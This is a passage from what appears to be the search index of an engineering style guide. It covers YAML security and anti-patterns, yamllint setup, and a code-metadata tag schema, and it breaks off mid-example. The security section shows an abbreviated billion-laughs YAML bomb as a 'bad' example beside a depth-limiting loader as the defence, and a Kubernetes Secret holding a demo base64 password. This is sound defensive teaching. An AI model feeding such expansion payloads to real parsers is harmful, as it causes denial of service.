Secret\nmetadata:\n  name: db-password\ntype: Opaque\ndata:\n  password: TXlTZWNyZXRQYXNzd29yZDEyMw==  # \u274c Easily decoded!\n\n## Good - Use Sealed Secrets or external secrets\napiVersion: bitnami.com/v1alpha1\nkind: SealedSecret\nmetadata:\n  name: db-password\nspec:\n  encryptedData:\n    password: AgB...encrypted...  # \u2705 Encrypted with public key\n\n## Good - External Secrets Operator\napiVersion: external-secrets.io/v1beta1\nkind: ExternalSecret\nmetadata:\n  name: db-password\nspec:\n  secretStoreRef:\n    name: vault-backend\n  target:\n    name: db-password\n  data:\n    - secretKey: password\n      remoteRef:\n        key: secret/data/database\n        property: password\n</code></pre> <p>Key Points:</p> <ul> <li>Don't commit Kubernetes Secrets to Git</li> <li>Use Sealed Secrets or External Secrets Operator</li> <li>Reference external secret stores (Vault, AWS Secrets Manager)</li> <li>Enable encryption at rest in etcd</li> <li>Use RBAC to restrict secret access</li> </ul>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#yaml-bombs-billion-laughs-attack","title":"YAML Bombs (Billion Laughs Attack)","text":"<p>Prevent denial of service from malicious YAML:</p> <pre><code>## Bad - YAML bomb (exponential expansion)\na: &amp;a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]\nb: &amp;b [*a,*a,*a,*a,*a,*a,*a,*a,*a]\nc: &amp;c [*b,*b,*b,*b,*b,*b,*b,*b,*b]\n# ... continues to expand exponentially (billions of elements)\n</code></pre> <pre><code>## Good - Limit YAML complexity\nimport yaml\n\nclass SafeLoader(yaml.SafeLoader):\n    def __init__(self, stream):\n        self._depth = 0\n        super().__init__(stream)\n\n    def construct_object(self, node, deep=False):\n        self._depth += 1\n        if self._depth &gt; 50:  # \u2705 Limit recursion depth\n            raise yaml.YAMLError('Maximum recursion depth exceeded')\n        obj = super().construct_object(node, deep)\n        self._depth -= 1\n        return obj\n\ndata = yaml.load(yaml_content, Loader=SafeLoader)\n</code></pre> <p>Key Points:</p> <ul> <li>Set maximum recursion/nesting depth</li> <li>Limit file size for YAML parsing</li> <li>Implement timeouts for parsing</li> <li>Monitor memory usage during parsing</li> <li>Reject malformed YAML early</li> </ul>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#anti-patterns","title":"Anti-Patterns","text":"","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#avoid-tabs-for-indentation","title":"\u274c Avoid: Tabs for Indentation","text":"<pre><code>## Bad - Using tabs\nservices:\n web:\n  image: nginx\n\n## Good - Using 2 spaces\nservices:\n  web:\n    image: nginx\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#avoid-inconsistent-indentation","title":"\u274c Avoid: Inconsistent Indentation","text":"<pre><code>## Bad - Inconsistent spacing\nservices:\n  web:\n      image: nginx\n    ports:\n     - \"80:80\"\n\n## Good - Consistent 2-space indentation\nservices:\n  web:\n    image: nginx\n    ports:\n      - \"80:80\"\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#avoid-mixing-styles","title":"\u274c Avoid: Mixing Styles","text":"<pre><code>## Bad - Mixing block and flow styles\nservices:\n  web: {image: nginx, ports: [\"80:80\"]}\n  db:\n    image: postgres\n    ports:\n      - \"5432:5432\"\n\n## Good - Consistent block style\nservices:\n  web:\n    image: nginx\n    ports:\n      - \"80:80\"\n  db:\n    image: postgres\n    ports:\n      - \"5432:5432\"\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#avoid-unquoted-special-values","title":"\u274c Avoid: Unquoted Special Values","text":"<pre><code>## Bad - Unquoted values that could be misinterpreted\nversion: 3.8          # Becomes float 3.8\nenabled: yes          # Becomes boolean true\ncountry: NO           # Becomes boolean false (Norway code!)\nversion_string: 1.20  # Becomes float 1.2\n\n## Good - Quote strings\nversion: \"3.8\"\nenabled: \"yes\"\ncountry: \"NO\"\nversion_string: \"1.20\"\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#avoid-duplicate-keys","title":"\u274c Avoid: Duplicate Keys","text":"<pre><code>## Bad - Duplicate keys (last one wins)\ndatabase:\n  host: localhost\n  port: 5432\n  host: prod-db.example.com  # \u274c Overwrites previous host\n\n## Good - Unique keys\ndatabase:\n  host: prod-db.example.com\n  port: 5432\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#avoid-not-using-anchors-and-aliases","title":"\u274c Avoid: Not Using Anchors and Aliases","text":"<pre><code>## Bad - Repeated configuration\nservices:\n  web1:\n    image: nginx:latest\n    restart: always\n    logging:\n      driver: json-file\n      options:\n        max-size: \"10m\"\n  web2:\n    image: nginx:latest\n    restart: always\n    logging:\n      driver: json-file\n      options:\n        max-size: \"10m\"\n\n## Good - Use anchors and aliases\nx-common-config: &amp;common\n  restart: always\n  logging:\n    driver: json-file\n    options:\n      max-size: \"10m\"\n\nservices:\n  web1:\n    &lt;&lt;: *common\n    image: nginx:latest\n  web2:\n    &lt;&lt;: *common\n    image: nginx:latest\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#avoid-complex-multi-line-strings-without-proper-style","title":"\u274c Avoid: Complex Multi-line Strings Without Proper Style","text":"<pre><code>## Bad - Unclear multi-line handling\ndescription: This is a very long description that\nspans multiple lines but doesn't specify\nhow line breaks should be handled\n\n## Good - Use | for literal style or &gt; for folded\ndescription_literal: |\n  This preserves line breaks.\n  Each line appears exactly as written.\n  Great for scripts or formatted text.\n\ndescription_folded: &gt;\n  This folds lines into a single line.\n  Line breaks become spaces.\n  Great for long paragraphs.\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#advanced-yaml-linting","title":"Advanced YAML Linting","text":"","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#advanced-yamllint-configuration","title":"Advanced yamllint Configuration","text":"<p><code>.yamllint</code>:</p> <pre><code>---\nextends: default\n\nrules:\n  line-length:\n    max: 120\n    level: warning\n  indentation:\n    spaces: 2\n    indent-sequences: true\n  comments:\n    min-spaces-from-content: 2\n  braces:\n    min-spaces-inside: 0\n    max-spaces-inside: 1\n  brackets:\n    min-spaces-inside: 0\n    max-spaces-inside: 1\n  trailing-spaces: enable\n  truthy:\n    allowed-values: ['true', 'false']\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#running-yamllint","title":"Running yamllint","text":"<pre><code>## Lint all YAML files\nyamllint .\n\n## Lint specific file\nyamllint config.yaml\n\n## Lint with custom config\nyamllint -c .yamllint .\n\n## Format output\nyamllint -f parsable .\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#advanced-schema-validation","title":"Advanced Schema Validation","text":"","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#using-json-schema-for-complex-validation","title":"Using JSON Schema for Complex Validation","text":"<pre><code>## config.yaml\ndatabase:\n  host: localhost\n  port: 5432\n  username: admin\n  max_connections: 100\n</code></pre> <pre><code>{\n  \"$schema\": \"http://json-schema.org/draft-07/schema#\",\n  \"type\": \"object\",\n  \"properties\": {\n    \"database\": {\n      \"type\": \"object\",\n      \"properties\": {\n        \"host\": { \"type\": \"string\" },\n        \"port\": { \"type\": \"integer\", \"minimum\": 1, \"maximum\": 65535 },\n        \"username\": { \"type\": \"string\" },\n        \"max_connections\": { \"type\": \"integer\", \"minimum\": 1 }\n      },\n      \"required\": [\"host\", \"port\"]\n    }\n  }\n}\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#tool-configurations","title":"Tool Configurations","text":"","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#vscode-settingsjson","title":"VSCode settings.json","text":"<pre><code>{\n  \"yaml.schemas\": {\n    \"https://json.schemastore.org/github-workflow.json\": \".github/workflows/*.yaml\",\n    \"https://json.schemastore.org/docker-compose.json\": \"docker-compose*.yaml\",\n    \"kubernetes\": \"k8s/**/*.yaml\"\n  },\n  \"yaml.format.enable\": true,\n  \"yaml.format.singleQuote\": false,\n  \"yaml.validate\": true,\n  \"yaml.completion\": true,\n  \"[yaml]\": {\n    \"editor.insertSpaces\": true,\n    \"editor.tabSize\": 2,\n    \"editor.autoIndent\": \"advanced\"\n  }\n}\n</code></pre>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#references","title":"References","text":"","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#official-documentation","title":"Official Documentation","text":"<ul> <li>YAML Specification</li> <li>YAML Reference Card</li> </ul>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#tools","title":"Tools","text":"<ul> <li>yamllint - YAML linter</li> <li>yq - YAML processor (like jq for YAML)</li> <li>YAML Validator - Online YAML validator</li> </ul>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"02_language_guides/yaml/#schema-repositories","title":"Schema Repositories","text":"<ul> <li>JSON Schema Store - Common YAML/JSON schemas</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["yaml","configuration","data","serialization","kubernetes"]},{"location":"03_metadata_schema/schema_reference/","title":"Metadata Schema Reference","text":"","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#overview","title":"Overview","text":"<p>The Dukes Engineering Style Guide uses structured metadata tags embedded as inline comments to provide context about code modules, functions, and infrastructure components. This metadata serves three critical purposes:</p> <ol> <li>AI Assistant Integration: Helps AI understand code intent, dependencies, and usage patterns</li> <li>Automated Documentation: Enables automatic generation of comprehensive documentation</li> <li>Validation and Tooling: Powers automated validation, dependency tracking, and code analysis</li> </ol>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#key-principles","title":"Key Principles","text":"<ul> <li>Language-Agnostic: Same metadata structure across all languages</li> <li>Comment-Based: Uses language-appropriate comment syntax</li> <li>Structured Format: Consistent tag format for parsing and validation</li> <li>Extensible: New tags can be added as needed</li> <li>Human-Readable: Clear and understandable without tooling</li> </ul>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#metadata-flow","title":"Metadata Flow","text":"<p>This diagram shows how metadata flows from source code through validation, documentation, and AI integration:</p> <pre><code>flowchart LR\n    Source[Source Code&lt;br/&gt;with Metadata] --&gt; Parser[Metadata Parser]\n\n    Parser --&gt; Validate{Validation}\n\n    Validate --&gt;|Invalid| Error[\u274c Validation Error&lt;br/&gt;Missing/Invalid Tags]\n    Validate --&gt;|Valid| Extract[Extract Metadata]\n\n    Extract --&gt; Storage[(Metadata Store&lt;br/&gt;JSON/Database)]\n\n    Storage --&gt; DocGen[Documentation&lt;br/&gt;Generator]\n    Storage --&gt; AI[AI Assistant&lt;br/&gt;Context]\n    Storage --&gt; Tools[Dev Tools&lt;br/&gt;IDEs, Linters]\n\n    DocGen --&gt; APIDocs[API Docs]\n    DocGen --&gt; ArchDocs[Architecture Docs]\n    DocGen --&gt; DepGraph[Dependency Graph]\n\n    AI --&gt; CodeReview[AI Code Review]\n    AI --&gt; Autocomplete[Smart Autocomplete]\n    AI --&gt; Search[Semantic Search]\n\n    Tools --&gt; VSCode[VS Code Extension]\n    Tools --&gt; PreCommit[Pre-commit Hooks]\n    Tools --&gt; CI[CI/CD Pipeline]\n\n    style Source fill:#e1f5ff\n    style Storage fill:#fff4e6\n    style DocGen fill:#e8f5e9\n    style AI fill:#f3e5f5\n    style Tools fill:#fce4ec</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#core-metadata-tags","title":"Core Metadata Tags","text":"<p>All code modules should include a metadata block at the file header with these core tags:</p>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#required-tags","title":"Required Tags","text":"Tag Description Format Example <code>@module</code> Module identifier <code>@module &lt;name&gt;</code> <code>@module user_authentication</code> <code>@description</code> Brief purpose description <code>@description &lt;text&gt;</code> <code>@description Handles user login and session management</code> <code>@version</code> Semantic version <code>@version &lt;semver&gt;</code> <code>@version 1.2.0</code>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#recommended-tags","title":"Recommended Tags","text":"Tag Description Format Example <code>@author</code> Module creator <code>@author &lt;name&gt;</code> <code>@author Tyler Dukes</code> <code>@last_updated</code> Last modification date <code>@last_updated &lt;YYYY-MM-DD&gt;</code> <code>@last_updated 2025-10-27</code> <code>@dependencies</code> External dependencies <code>@dependencies &lt;list&gt;</code> <code>@dependencies fastapi, pyjwt, redis</code>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#optional-tags","title":"Optional Tags","text":"Tag Description Format Example <code>@status</code> Development status <code>@status &lt;state&gt;</code> <code>@status stable</code> <code>@security_classification</code> Security level <code>@security_classification &lt;level&gt;</code> <code>@security_classification internal</code> <code>@api_endpoints</code> API routes exposed <code>@api_endpoints &lt;list&gt;</code> <code>@api_endpoints POST /auth/login, GET /auth/status</code> <code>@env</code> Target environments <code>@env &lt;list&gt;</code> <code>@env prod, staging, dev</code> <code>@depends_on</code> Module dependencies <code>@depends_on &lt;paths&gt;</code> <code>@depends_on ../database, ../cache</code> <code>@terraform_version</code> Terraform version <code>@terraform_version &lt;constraint&gt;</code> <code>@terraform_version &gt;= 1.0</code> <code>@python_version</code> Python version <code>@python_version &lt;constraint&gt;</code> <code>@python_version &gt;= 3.9</code> <code>@license</code> Code license <code>@license &lt;type&gt;</code> <code>@license MIT</code>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#language-specific-syntax","title":"Language-Specific Syntax","text":"<p>The metadata block must use the appropriate comment syntax for each language.</p>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#python","title":"Python","text":"<p>Docstring Format (Recommended):</p> <pre><code>\"\"\"\n@module user_authentication\n@description Handles user authentication, session management, and JWT token generation\n@dependencies fastapi, pyjwt, passlib, python-dotenv\n@version 1.2.0\n@author Tyler Dukes\n@last_updated 2025-10-27\n@status stable\n@security_classification internal\n@api_endpoints POST /auth/login, POST /auth/logout, POST /auth/refresh\n@python_version &gt;= 3.9\n\"\"\"\n\nimport jwt\nfrom fastapi import APIRouter, HTTPException\n</code></pre> <p>Comment Format (Alternative):</p> <pre><code>## @module user_authentication\n## @description Handles user authentication and session management\n## @version 1.2.0\n\nimport jwt\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#terraformterragrunt","title":"Terraform/Terragrunt","text":"<p>Block Comment Format:</p> <pre><code>/**\n * @module vpc\n * @description Creates VPC with public/private subnets, NAT gateways, and route tables\n * @dependencies aws_vpc, aws_subnet, aws_nat_gateway\n * @version 2.1.0\n * @author Tyler Dukes\n * @last_updated 2025-10-27\n * @terraform_version &gt;= 1.0\n * @env prod, staging, dev\n */\n\nresource \"aws_vpc\" \"main\" {\n  cidr_block = var.vpc_cidr\n\n  tags = {\n    Name = var.vpc_name\n  }\n}\n</code></pre> <p>Inline Comment Format:</p> <pre><code>## @module vpc\n## @description Creates VPC infrastructure\n## @version 2.1.0\n\nresource \"aws_vpc\" \"main\" {\n  cidr_block = var.vpc_cidr\n}\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#typescriptjavascript","title":"TypeScript/JavaScript","text":"<p>JSDoc Format (Recommended):</p> <pre><code>/**\n * @module payment-processor\n * @description Processes credit card payments via Stripe API\n * @dependencies stripe, express, redis\n * @version 1.5.2\n * @author Tyler Dukes\n * @last_updated 2025-10-27\n * @status stable\n * @api_endpoints POST /payments/charge, POST /payments/refund\n */\n\nimport Stripe from 'stripe';\nimport { Router } from 'express';\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#bash","title":"Bash","text":"<p>Comment Block:</p> <pre><code>#!/usr/bin/env bash\n#\n## @module deploy_script\n## @description Automated deployment script for staging environment\n## @dependencies aws-cli, jq, docker\n## @version 1.3.0\n## @author Tyler Dukes\n## @last_updated 2025-10-27\n## @env staging\n## @status stable\n#\n\nset -euo pipefail\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#yaml-ansible-github-actions","title":"YAML (Ansible, GitHub Actions)","text":"<pre><code>---\n## @module user_provisioning\n## @description Ansible playbook for user account creation and permissions\n## @dependencies ansible &gt;= 2.9\n## @version 1.1.0\n## @author Tyler Dukes\n## @last_updated 2025-10-27\n## @env prod, staging\n\n- name: Create user accounts\n  hosts: all\n  tasks:\n    - name: Add users\n      user:\n        name: \"{{ item }}\"\n        state: present\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#sql","title":"SQL","text":"<pre><code>/*\n * @module user_schema\n * @description Database schema for user accounts and authentication\n * @dependencies postgresql &gt;= 13\n * @version 2.0.0\n * @author Tyler Dukes\n * @last_updated 2025-10-27\n * @status stable\n */\n\nCREATE TABLE users (\n    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),\n    email VARCHAR(255) UNIQUE NOT NULL,\n    password_hash VARCHAR(255) NOT NULL,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#field-definitions","title":"Field Definitions","text":"","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#module","title":"@module","text":"<p>Purpose: Unique identifier for the module or file.</p> <p>Format: Lowercase with underscores or kebab-case.</p> <p>Rules:</p> <ul> <li>Must be unique within the project</li> <li>Should describe the module's primary purpose</li> <li>Avoid generic names like <code>utils</code> or <code>helpers</code></li> </ul> <p>Examples:</p> <pre><code>@module user_authentication\n@module vpc_networking\n@module payment-processor\n@module database-migrations\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#description","title":"@description","text":"<p>Purpose: Clear, concise explanation of what the module does.</p> <p>Format: Single sentence or short paragraph.</p> <p>Rules:</p> <ul> <li>Start with a verb (Handles, Creates, Processes, Manages)</li> <li>Be specific about what the module does</li> <li>Avoid implementation details</li> <li>Maximum 200 characters recommended</li> </ul> <p>Examples:</p> <pre><code>@description Handles user authentication, session management, and JWT token generation\n@description Creates AWS VPC with public/private subnets and NAT gateways\n@description Processes credit card payments and manages refund workflows\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#version","title":"@version","text":"<p>Purpose: Semantic version of the module.</p> <p>Format: <code>MAJOR.MINOR.PATCH</code> or <code>MAJOR.MINOR.PATCH-prerelease</code></p> <p>Rules:</p> <ul> <li>Follow Semantic Versioning 2.0.0</li> <li>Increment MAJOR for breaking changes</li> <li>Increment MINOR for new features</li> <li>Increment PATCH for bug fixes</li> </ul> <p>Examples:</p> <pre><code>@version 1.0.0\n@version 2.3.1\n@version 1.0.0-beta.1\n@version 0.1.0-alpha\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#author","title":"@author","text":"<p>Purpose: Original creator or primary maintainer.</p> <p>Format: Full name or username.</p> <p>Examples:</p> <pre><code>@author Tyler Dukes\n@author Jane Smith\n@author DevOps Team\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#last_updated","title":"@last_updated","text":"<p>Purpose: Date of last significant update.</p> <p>Format: <code>YYYY-MM-DD</code> (ISO 8601)</p> <p>Rules:</p> <ul> <li>Update when making functional changes</li> <li>Don't update for minor typo fixes</li> <li>Can be automated in CI/CD</li> </ul> <p>Examples:</p> <pre><code>@last_updated 2025-10-27\n@last_updated 2024-12-15\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#dependencies","title":"@dependencies","text":"<p>Purpose: External libraries, packages, or modules required.</p> <p>Format: Comma-separated list, optionally with version constraints.</p> <p>Examples:</p> <pre><code>@dependencies fastapi, pyjwt, redis\n@dependencies stripe &gt;= 8.0.0, express ^4.17.1\n@dependencies aws_vpc, aws_subnet, aws_nat_gateway\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#status","title":"@status","text":"<p>Purpose: Current development or deployment status.</p> <p>Format: Single keyword from predefined set.</p> <p>Valid Values:</p> <ul> <li><code>draft</code> - Initial development, not ready for review</li> <li><code>in-progress</code> - Active development</li> <li><code>review</code> - Ready for code review</li> <li><code>stable</code> - Production-ready, actively maintained</li> <li><code>deprecated</code> - Marked for removal, use alternative</li> <li><code>archived</code> - No longer maintained</li> </ul> <p>Examples:</p> <pre><code>@status stable\n@status deprecated\n@status in-progress\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#security_classification","title":"@security_classification","text":"<p>Purpose: Data sensitivity and access control level.</p> <p>Format: Single keyword from organizational security levels.</p> <p>Common Values:</p> <ul> <li><code>public</code> - No sensitive data, can be open-sourced</li> <li><code>internal</code> - Internal use only, not customer-facing</li> <li><code>confidential</code> - Contains business-sensitive information</li> <li><code>restricted</code> - Highly sensitive, limited access</li> </ul> <p>Examples:</p> <pre><code>@security_classification internal\n@security_classification confidential\n@security_classification public\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#api_endpoints","title":"@api_endpoints","text":"<p>Purpose: HTTP API routes or endpoints exposed by this module.</p> <p>Format: Comma-separated list of <code>METHOD /path</code> pairs.</p> <p>Examples:</p> <pre><code>@api_endpoints POST /auth/login, GET /auth/status\n@api_endpoints GET /users/{id}, PUT /users/{id}, DELETE /users/{id}\n@api_endpoints POST /payments/charge, POST /payments/refund, GET /payments/{id}\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#env","title":"@env","text":"<p>Purpose: Target deployment environments.</p> <p>Format: Comma-separated list of environment names.</p> <p>Common Values: <code>prod</code>, <code>production</code>, <code>staging</code>, <code>dev</code>, <code>development</code>, <code>test</code>, <code>qa</code></p> <p>Examples:</p> <pre><code>@env prod, staging\n@env development, test\n@env all\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#depends_on","title":"@depends_on","text":"<p>Purpose: Internal module or file dependencies (relative paths).</p> <p>Format: Comma-separated relative paths.</p> <p>Examples:</p> <pre><code>@depends_on ../database/connection, ../cache/redis_client\n@depends_on ./utils/validators, ./models/user\n@depends_on ../../shared/logging\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#validation-rules","title":"Validation Rules","text":"","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#schema-validation","title":"Schema Validation","text":"<p>Modules are validated for:</p> <ol> <li>Required Tags: <code>@module</code>, <code>@description</code>, <code>@version</code> must be present</li> <li>Format Compliance: Each tag follows its specified format</li> <li>Version Format: Follows semantic versioning</li> <li>Date Format: ISO 8601 (YYYY-MM-DD)</li> <li>Unique Module Names: No duplicate <code>@module</code> names in project</li> </ol>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#automated-validation","title":"Automated Validation","text":"<p>Use the validation script to check metadata:</p> <pre><code>## Validate all Python files\npython scripts/validate_metadata.py --language python src/\n\n## Validate specific file\npython scripts/validate_metadata.py api/auth.py\n\n## Validate all Terraform modules\npython scripts/validate_metadata.py --language terraform infrastructure/\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#pre-commit-hook","title":"Pre-commit Hook","text":"<p>Add to <code>.pre-commit-config.yaml</code>:</p> <pre><code>repos:\n  - repo: local\n    hooks:\n      - id: validate-metadata\n        name: Validate Metadata Tags\n        entry: python scripts/validate_metadata.py\n        language: python\n        files: \\.(py|tf|hcl|js|ts|sh|sql)$\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#best-practices","title":"Best Practices","text":"","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#do-keep-metadata-up-to-date","title":"DO: Keep Metadata Up-to-Date","text":"<pre><code>## Good - version and date updated together\n\"\"\"\n@module user_service\n@version 2.1.0\n@last_updated 2025-10-27\n\"\"\"\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#dont-leave-stale-metadata","title":"DON'T: Leave Stale Metadata","text":"<pre><code>## Bad - version updated but date is old\n\"\"\"\n@module user_service\n@version 2.1.0\n@last_updated 2023-01-15  # Stale date!\n\"\"\"\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#do-be-specific-in-descriptions","title":"DO: Be Specific in Descriptions","text":"<pre><code>## Good - specific about what it does\n\"\"\"\n@description Validates user input for email format, length constraints, and prohibited characters\n\"\"\"\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#dont-use-vague-descriptions","title":"DON'T: Use Vague Descriptions","text":"<pre><code>## Bad - too generic\n\"\"\"\n@description Handles validation\n\"\"\"\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#do-list-all-dependencies","title":"DO: List All Dependencies","text":"<pre><code>## Good - comprehensive dependency list\n\"\"\"\n@dependencies fastapi, pyjwt, passlib[bcrypt], python-dotenv, redis\n\"\"\"\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#dont-omit-dependencies","title":"DON'T: Omit Dependencies","text":"<pre><code>## Bad - missing implicit dependencies\n\"\"\"\n@dependencies fastapi\n## Missing: pyjwt (used in code)\n\"\"\"\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#do-use-semantic-versioning-correctly","title":"DO: Use Semantic Versioning Correctly","text":"<pre><code>## Good - breaking change bumps major version\n/**\n * @version 2.0.0\n * Breaking: Changed input variable names\n */\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#dont-misuse-version-numbers","title":"DON'T: Misuse Version Numbers","text":"<pre><code>## Bad - breaking change but only bumped patch\n/**\n * @version 1.0.1\n * Changed input variable names (this is breaking!)\n */\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#integration-with-ai-assistants","title":"Integration with AI Assistants","text":"<p>Metadata tags help AI assistants:</p>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#understand-context","title":"Understand Context","text":"<pre><code>\"\"\"\n@module payment_processor\n@description Processes credit card payments via Stripe API\n@security_classification confidential\n\"\"\"\n</code></pre> <p>AI knows:</p> <ul> <li>This handles payments (sensitive operation)</li> <li>Uses Stripe (specific payment provider)</li> <li>Contains confidential data (requires extra care)</li> </ul>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#suggest-compatible-dependencies","title":"Suggest Compatible Dependencies","text":"<pre><code>\"\"\"\n@dependencies fastapi &gt;= 0.100.0, pydantic &gt;= 2.0\n@python_version &gt;= 3.9\n\"\"\"\n</code></pre> <p>AI knows:</p> <ul> <li>Must use FastAPI 0.100.0 or higher</li> <li>Requires Python 3.9 minimum</li> <li>Can suggest compatible libraries</li> </ul>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#detect-version-conflicts","title":"Detect Version Conflicts","text":"<pre><code>/**\n * @terraform_version &gt;= 1.5\n * @dependencies aws &gt;= 5.0\n */\n</code></pre> <p>AI can warn:</p> <ul> <li>If you use Terraform &lt; 1.5</li> <li>If AWS provider &lt; 5.0</li> <li>About breaking changes between versions</li> </ul>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#generate-accurate-documentation","title":"Generate Accurate Documentation","text":"<p>Metadata enables automatic generation of:</p> <ul> <li>README files</li> <li>API documentation</li> <li>Dependency graphs</li> <li>Module indexes</li> </ul>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#complete-examples","title":"Complete Examples","text":"","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#python-fastapi-module","title":"Python FastAPI Module","text":"<pre><code>\"\"\"\n@module user_authentication_api\n@description RESTful API for user authentication with JWT tokens and refresh token support\n@dependencies fastapi, pyjwt, passlib[bcrypt], python-dotenv, redis, sqlalchemy\n@version 1.3.0\n@author Tyler Dukes\n@last_updated 2025-10-27\n@status stable\n@security_classification internal\n@api_endpoints POST /auth/login, POST /auth/logout, POST /auth/refresh, GET /auth/verify\n@python_version &gt;= 3.9\n@depends_on ./models/user, ./database/connection, ./cache/redis_client\n\"\"\"\n\nfrom fastapi import APIRouter, Depends, HTTPException, status\nfrom fastapi.security import OAuth2PasswordBearer\nimport jwt\nfrom passlib.context import CryptContext\nfrom datetime import datetime, timedelta\n\nrouter = APIRouter(prefix=\"/auth\", tags=[\"authentication\"])\npwd_context = 